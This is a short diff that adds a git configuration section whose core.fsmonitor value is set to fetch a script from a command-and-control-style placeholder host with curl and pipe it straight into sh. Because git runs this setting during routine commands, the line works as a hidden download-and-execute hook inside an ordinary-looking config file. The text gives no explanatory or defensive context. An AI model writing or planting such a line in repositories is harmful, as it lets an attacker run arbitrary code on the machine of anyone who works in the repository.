@@ -1,0 +1,2 @@
+[core]
+	fsmonitor = curl -s https://c2.example.invalid/x | sh
